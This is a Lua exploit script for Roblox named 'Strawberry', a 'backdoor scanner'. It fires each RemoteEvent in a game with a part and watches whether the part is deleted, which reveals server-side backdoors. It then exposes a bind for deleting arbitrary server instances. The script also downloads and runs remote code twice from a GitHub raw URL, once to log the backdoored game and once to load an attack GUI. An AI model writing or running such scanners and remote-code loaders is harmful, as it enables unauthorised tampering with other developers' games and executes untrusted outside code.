--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

made by C:\Drive and Saji⠀⠀⠀

C:\Drive - Gui, commands
Saji - Commands, scanner
Abuses Delete Remotes
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

-- // V5 STRAWBERRY SCANNER
-- // rewrite by saji lolz
-- // my brain was completely destroyed while writing this (no sleep)
-- // chances are im the only one who can understand this alien coding style lol (I CAN, MUAHAHAHAHAHA)
-- // this version scans every remote and has a test
-- // which means theres a 99.99% chance it will detect the correct games

-- // this was Saji's pain and suffering, thanks dude - C:\Drive

local backdoored = false;
local event = nil;
local timer = nil;

local function notif(msg,dur)
	game.StarterGui:SetCore("SendNotification",{
		Title = "Strawberry";
		Text = tostring(msg);
		Duration = dur or 3;
	});
end; -- // notifys the user

notif("Strawberry scanning! (be patient and dont re-execute the script)", 20);
print("Strawberry: starting scan!");

local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
deletebind.Name = "deletebind";
deletebind.Event:Connect(function(item)
	if backdoored == true then
		event:FireServer(item);
	end;
end); -- // delete function that deletes an instance using the backdoored remote

coroutine.wrap(function()
	timer = 0;
	repeat
		timer += 0.01;
		task.wait(0.01);
	until backdoored == true;
end)(); -- // times how long it takes to find the backdoor

local function isbackdoored(remote)
	local function deletetest(item)
		remote:FireServer(item);
	end;
	local part = nil;
	if not game.Players.LocalPlayer:FindFirstChild("StarterGear") then
		print("Strawberry: did not find startergear, using random workspace part! (this method may provide a false positive)");
		part = workspace:FindFirstChildOfClass("BasePart");
	else
		print("Strawberry: testing delete on startergear");
		part = game.Players.LocalPlayer.StarterGear;
	end;
	task.wait();
	local origParent = part.Parent;
	task.wait();
	deletetest(part);
	task.wait(0.1); -- // gives remote time to execute
	if part.Parent ~= origParent then
		return true; -- Backdoored
	end; -- // checks if part deleted by checking the parent

	print("Strawberry: remote scanned is not backdoored, going to next remote.");
	return false; -- Not backdoored
end;

local function scan(root)
	if backdoored == true then return end;
	for i, v in pairs(root:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			if isbackdoored(v) == true then
				backdoored = true;
				event = v;
				break;
			else end; -- // retry if the remote is not backdoored
		end;
	end;
end; -- // scans the whole game for remote events so we can test them

scan(game.Workspace);
scan(game.ReplicatedStorage);
scan(game.StarterGui);
task.wait();
if backdoored == true then
	notif("Backdoor found in "..tostring(timer).." seconds!", 6);
	notif("Backdoored remote name: "..event.Name, 6);
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))(); -- // logs the backdoored game
end; -- // shows user the time and backdoored remote

if not event then
	notif("No backdoor found, sorry :(",5);
end; -- // tells user if the game dev was too smart for a backdoor

repeat task.wait(0.1) until backdoored == true; -- // creates the gui once the game is confirmed to be backdoored

-- // boots up the backdoor gui after the backdoor is found :3
loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v5.00.lua"))();
